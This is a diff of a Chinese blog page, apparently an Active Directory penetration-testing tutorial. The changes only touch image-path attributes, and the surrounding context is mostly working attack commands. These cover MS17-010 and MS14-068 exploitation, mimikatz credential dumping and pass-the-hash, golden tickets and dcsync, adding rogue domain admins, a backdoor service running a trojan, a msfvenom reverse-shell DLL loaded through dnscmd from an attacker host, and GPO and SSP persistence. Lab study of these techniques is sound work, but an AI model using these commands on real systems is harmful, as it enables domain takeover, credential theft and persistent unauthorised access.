 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_version //先使用扫描器看是否存在漏洞<br>show target //展示可以利用的系统名称<br>run //运行扫描<br>use exploit/windows/smb/ms17_010_psexec //使用这个利用程序<br>show options //展示利用的选项<br>exploit //执行利用脚本<br>最后利用成功了使用shell即可计入页面<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720205120743.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230720205120743"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720205120743.png" srcset="/img/loading.gif" lazyload alt="image-20230720205120743"> </p>
 <h2 id="MS14-068（CVE-2014-6324）-域提权"><a href="#MS14-068（CVE-2014-6324）-域提权" class="headerlink" title="MS14-068（CVE-2014-6324） 域提权"></a>MS14-068（CVE-2014-6324） 域提权</h2><p>利用 MS14-068 来提权,先检查下是否有 <code>MS14-068</code>, CVE 编号 <code>CVE-2014-6324</code>,补丁为 3011780 ：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo |find <span class="hljs-string">&quot;3011780&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>如果返回为空就说明没有打补丁,存在漏洞,需要注意的是域内普通用户提权成功后是有时效性的。</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152757686.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152757686"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152757686.png" srcset="/img/loading.gif" lazyload alt="image-20230731152757686"> </p>
 <p>我们先进行一下域的信息收集。</p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span><br><br><span class="hljs-built_in">ping</span> <span class="hljs-number">08</span>server-dc.moonsec.fbi<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152817989.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152817989"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152817989.png" srcset="/img/loading.gif" lazyload alt="image-20230731152817989"> </p>
 <p>我们先使用IPC$访问一下试一下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\08server-dc.moonsec.fbi\c$<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152853398.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152853398"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152853398.png" srcset="/img/loading.gif" lazyload alt="image-20230731152853398"> </p>
 <p>上传 mimikatz 和 MS14-068 提权工具， whoami &#x2F;user 或者 whoami&#x2F;all 查看 test用户的 suid：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /user<br><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152901060.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152901060"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152901060.png" srcset="/img/loading.gif" lazyload alt="image-20230731152901060"> </p>
 <p>使用方法：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址</span><br>ms14-068.exe -u jerry@0day.org -p Admin12345 -s S-1-5-21-1812960810-2335050734-3517558805-1128 -d OWA2010SP3.0day.org<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152908409.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152908409">  </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152908409.png" srcset="/img/loading.gif" lazyload alt="image-20230731152908409">  </p>
 <p>使用 mimikatz 清空之前缓存的凭证，导入伪造的凭证：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进一步提升权限</span><br>privilege::debug<br><br><span class="hljs-comment"># 清空票据</span><br>kerberos::purge<br><br><span class="hljs-comment"># 票据文件地址</span><br>kerberos::ptc C:\Users\Administrator\Desktop\mimikatz_trunk\x64\TGT_test@moonsec.fbi.ccache<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152917134.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152917134">  </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152917134.png" srcset="/img/loading.gif" lazyload alt="image-20230731152917134">  </p>
 <p>再输入 <code>dir \\08server-dc.moonsec.fbi\c$</code> ，发现访问成功，现在我们有域管的权限:</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152930732.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731152930732">  </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152930732.png" srcset="/img/loading.gif" lazyload alt="image-20230731152930732">  </p>
 <p>我们直接添加一个域管账号密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user lian QWEasd123 /add /domain<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> lian /add /domain<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2934784-20220731095312814-1394654338.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2934784-20220731095312814-1394654338.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
 <p>这样我们就实现了对域控的控制，为了权限维持我们还可以做一个影子账号实现对服务器的长久控制。</p>
 <h2 id="哈希传递PTH攻击及白利用"><a href="#哈希传递PTH攻击及白利用" class="headerlink" title="哈希传递PTH攻击及白利用"></a>哈希传递PTH攻击及白利用</h2><h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>NTLM这一名词是由以下单词的首字母拼凑而成的∶</p>
 <p>NT:New technologies ( windows 的新技术)</p>
 <p>LAN:本地局域网(Local area network )</p>
 <p>M:管理者( Manager )</p>
 <p>NTLM hash是指windows系统下Security Account Manager中保存的用户密码hash</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726193935358.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726193935358"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726193935358.png" srcset="/img/loading.gif" lazyload alt="image-20230726193935358"> </p>
 <h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><p>Windows 8.1和 Windows Server 2012 R2默认支持该功能</p>
 <p>windows 7和 windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</p>
 <p>从windows Vista和 windows Server 2008开始，微软默认禁用LM hash在windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz就读不到密码明文。此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为: </p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724184106453.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230724184106453"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724184106453.png" srcset="/img/loading.gif" lazyload alt="image-20230724184106453"> </p>
 <h3 id="使用mimikatz进行PTH"><a href="#使用mimikatz进行PTH" class="headerlink" title="使用mimikatz进行PTH"></a>使用mimikatz进行PTH</h3><p>第一步</p>
 <p>重置本地管理员admin的密码</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug  <span class="hljs-comment">//提权</span><br>sekurlsa::logonpasswords <span class="hljs-comment">//获取密码</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724195448585.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230724195448585"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724195448585.png" srcset="/img/loading.gif" lazyload alt="image-20230724195448585"> </p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span>.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa:logonpasswords&quot;</span> &gt;<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure>
 
 
@@ -550,13 +550,13 @@
 <p>然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>sekurlsa::pth /user:administrator /domain:whoamianony /ntlm:ab89b1295e69d353dd7614c7a3a80cec<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726194340589.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726194340589"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726194340589.png" srcset="/img/loading.gif" lazyload alt="image-20230726194340589"> </p>
 <p>上面的操作可化简为下面这一句话</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mimikatz.exe privilege::<span class="hljs-built_in">debug</span> <span class="hljs-string">&quot;sekurlsa::pth /domain:test /user:administrator /ntlm:ba4d237c6f6fd9c55ffc111b3ac10989 /run:cmd.exe&quot;</span> <br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726195601800.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726195601800"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726195601800.png" srcset="/img/loading.gif" lazyload alt="image-20230726195601800"> </p>
 <p>成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726200722285.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726200722285"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726200722285.png" srcset="/img/loading.gif" lazyload alt="image-20230726200722285"> </p>
 <p>此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。</p>
 <p>生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> \\DC.whoamianony.org\<span class="hljs-keyword">c</span>$    // 将 <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> 复制到域控主机上<br></code></pre></td></tr></table></figure>
@@ -565,7 +565,7 @@
 
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> create backdoor binpath= <span class="hljs-string">&quot;c:\shell.exe&quot;</span>    <span class="hljs-comment">// 在域控上创建服务启动木马</span><br>sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> start backdoor     <span class="hljs-comment">// 在域控上立即启动该服务</span><br>sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> delete backdoor     <span class="hljs-comment">// 在域控上立即删除该服务</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/1626405634_60f0fb0237fbad87f64d7.png!small" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20210711122041394"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/1626405634_60f0fb0237fbad87f64d7.png!small" srcset="/img/loading.gif" lazyload alt="image-20210711122041394"> </p>
 <p>此时虽然显示 1053 错误，但是如下图所示，域控制器成功上线，并且还是 SYSTEM 权限：</p>
 <p>注意，哈希传递攻击要注意一下几点：</p>
 <blockquote>
@@ -582,7 +582,7 @@
 <p><strong>-d：</strong>指定域</p>
 <p><strong>-x：</strong>执行系统命令</p>
 </blockquote>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726201627478.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230726201627478"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726201627478.png" srcset="/img/loading.gif" lazyload alt="image-20230726201627478"> </p>
 <h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># PTH 命令执行 Or 远程登录</span><br>impacket-wmiexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-psexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-smbexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-dcomexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-atexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">#导出SAM密码、lsa内存密码</span><br>impacket-secretsdump  -hashes <span class="hljs-symbol">:</span><span class="hljs-number">35</span>b5a70f68f5ef895d52d15d8d84af6b <span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br><br><span class="hljs-comment"># OPTH</span><br>impacket-smbexec -k -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">Domain</span>/<span class="hljs-title class_">Administrator</span>@机器名<br><br><br></code></pre></td></tr></table></figure>
 
 <h2 id="PTT攻击-1"><a href="#PTT攻击-1" class="headerlink" title="PTT攻击"></a>PTT攻击</h2><p>终于又到了我最喜欢的实战环节，这里介绍域内常用的两种攻击方式：黄金票据（Golden ticket）、白银票据 （SILVER ticket）。</p>
@@ -598,7 +598,7 @@
 <li>伪造任意用户名</li>
 </ul>
 <p>登录域管用户，执行 whoami 可以看到是 administrator 用户：</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731155849018.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230731155849018"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731155849018.png" srcset="/img/loading.gif" lazyload alt="image-20230731155849018"> </p>
 <p>先使用一下命令导出用户 krbtgt 的 hash：</p>
 <figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">mimikatz.exe &quot;privilege::debug<span class="hljs-string">&quot; &quot;</span>lsadump::dcsync /domain:<span class="hljs-number">0</span>day.org /user:krbtgt<span class="hljs-string">&quot; &quot;</span>exit<span class="hljs-string">&quot;&gt; passwordhash.txt</span><br></code></pre></td></tr></table></figure>
 
@@ -665,10 +665,10 @@
 
 <h2 id="DNSAdmins组权限利用"><a href="#DNSAdmins组权限利用" class="headerlink" title="DNSAdmins组权限利用"></a>DNSAdmins组权限利用</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>这个提权的功能需要一个用户，这个用户是DNSAdmins组中的成员或者对SYSTEM权限下的DNS服务具有写的权限且能够加载任意DLL。</p>
 <h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>DNSAdmins组成中的成员具有写的权限且能够加载任意dll</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806100403214.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230806100403214"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806100403214.png" srcset="/img/loading.gif" lazyload alt="image-20230806100403214"> </p>
 <p>修改这里的隶属于</p>
 <p>我们在win10主机上即可看到添加成功</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806101645382.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230806101645382"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806101645382.png" srcset="/img/loading.gif" lazyload alt="image-20230806101645382"> </p>
 <p>生成一个shell.dll文件来主动连接我们的kali</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.3.3 <span class="hljs-attribute">LPORT</span>=2333 <span class="hljs-attribute">--platform</span>=windows -f dll &gt; shell.dll<br></code></pre></td></tr></table></figure>
 
@@ -676,7 +676,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python3-impacket<span class="hljs-regexp">/examples/</span>smbserver.py shell ./shell<br></code></pre></td></tr></table></figure>
 
 <p>使用域控dir这个服务，成功</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806105917428.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230806105917428"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806105917428.png" srcset="/img/loading.gif" lazyload alt="image-20230806105917428"> </p>
 <p>在被攻击主机上远程加载我们生成的dll</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">.\dnscmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">0</span>day.org /config /serverlevelplugindll \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.3</span>\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">shell</span>.dll<br></code></pre></td></tr></table></figure>
 
@@ -712,7 +712,7 @@
 </li>
 </ol>
 </blockquote>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230910145127676.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230910145127676"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230910145127676.png" srcset="/img/loading.gif" lazyload alt="image-20230910145127676"> </p>
 <h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><ol>
 <li><p>获取 krbtgt 的 NTLM hash</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 域控制器中使用mimikatz查看 krbtgt 的 NTLM hash</span><br>privilege::debug<br>lsadump::lsa /patch /name:krbtgt<br><br><span class="hljs-comment"># 得到NTLM : fa02a0e57e5ba9189d00990ae64e87ce</span><br></code></pre></td></tr></table></figure>
@@ -721,7 +721,7 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 查看同步前 DSRM 账号的 NTLM hash</span><br>token::elevate<br>lsadump::sam<br><br><span class="hljs-comment"># 将 DSRM 账号和 krbtgt 的 NTLM Hash 同步</span><br>NTDSUTIL<br><span class="hljs-built_in">set</span> DSRM password<br><span class="hljs-built_in">sync</span> from domain account krbtgt<br><br><span class="hljs-comment"># 查看同步后 DSRM 账号的 NTLM hash</span><br>lsadump::sam<br></code></pre></td></tr></table></figure></li>
 </ol>
 <p>在同步前与同步后进行对比</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2526173-20220328102112820-362539798.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="img"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2526173-20220328102112820-362539798.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
 <h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>利用 mimikatz 使用 DSRM 账号通过网络远程登录域控制器</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在域成员机器的管理员(如本地管理员)模式下打开 mimikatz</span><br>privilege::debug<br><span class="hljs-comment"># 注意：此处的 /domain 的值为域控制器的主机名</span><br>sekurlsa::pth /domain:dc /user:administrator /ntlm:fa02a0e57e5ba9189d00990ae64e87ce<br><br><span class="hljs-comment"># Hash 传递完成后，在弹出的命令行窗口中打开mimikatz，使用 dcsync 功能远程转储 hash。</span><br>lsadump::dcsync /domain:test.lab /dc:dc /user:krbtgt<br><br><span class="hljs-built_in">dir</span> \\dc\c$<br></code></pre></td></tr></table></figure>
 
@@ -735,39 +735,39 @@
 
 <p>所有域内主机都能访问。<br>我这里创建一个全局的GPO，作用于所有域用户内容设置了一些计划任务来进行模拟测试。攻击者也可以利用其功能来推出恶意软件、创建&#x2F;修改计划任务、降级凭据保护、向所有计算机添加新的本地帐户被添加到本地管理员组。甚至更改现有的安全策略，以启用明文密码提取。</p>
 <p>打开组策略管理器，右键默认配置，可以发现有脚本方面的设置</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911213843639.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911213843639"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911213843639.png" srcset="/img/loading.gif" lazyload alt="image-20230911213843639"> </p>
 <p>点击登录即可设置登录所利用的脚本</p>
 <p>可以放一个1.bat</p>
 <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">calc<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140924289.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20240302140924289"> </p>
-<p><img src="D:\mdimage\image-20230911215043683.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911215043683"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140924289.png" srcset="/img/loading.gif" lazyload alt="image-20240302140924289"> </p>
+<p><img src="D:\mdimage\image-20230911215043683.png" srcset="/img/loading.gif" lazyload alt="image-20230911215043683"> </p>
 <p>可以直接在域控上面运行这个shell，或者curl上面所提供的url</p>
 <p>运行完以后，我们需要修改将我们之前的bat替换成我们所需要的bat文件</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911215401438.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911215401438"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911215401438.png" srcset="/img/loading.gif" lazyload alt="image-20230911215401438"> </p>
 <p>成功添加</p>
 <p>登录任意域用户，更新组策略</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpupdate /force<br></code></pre></td></tr></table></figure>
 
 <p>重新启动，发现谈计算器了</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222753566.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911222753566"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222753566.png" srcset="/img/loading.gif" lazyload alt="image-20230911222753566"> </p>
 <p>msf也成功上线</p>
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222805648.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911222805648"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222805648.png" srcset="/img/loading.gif" lazyload alt="image-20230911222805648"> </p>
 <h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2><h3 id="直接mimikatz"><a href="#直接mimikatz" class="headerlink" title="直接mimikatz"></a>直接mimikatz</h3><p>直接在域控值其上面用mimikatz</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>misc::memssp<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911225437077.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230911225437077"> </p>
+<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911225437077.png" srcset="/img/loading.gif" lazyload alt="image-20230911225437077"> </p>
 <p>注销当前用户。输入用户名和密码后重新登录，获取明文密码，密码存储在日志文件C:\Windows\System32\mimilsa.log中。</p>
 <h3 id="mimilib-dll注入"><a href="#mimilib-dll注入" class="headerlink" title="mimilib.dll注入"></a>mimilib.dll注入</h3><p>将mimikatz中的mimilib.dll放到系统的C:\Windows\System32\目录下，并将mimilib添加到注册表中。使用这种方法，系统重启也不会影响持久化的效果。</p>
 <p>1）将mimikatz中的mimilib.dll复制到系统的C:\Windows\System32\目录下！</p>
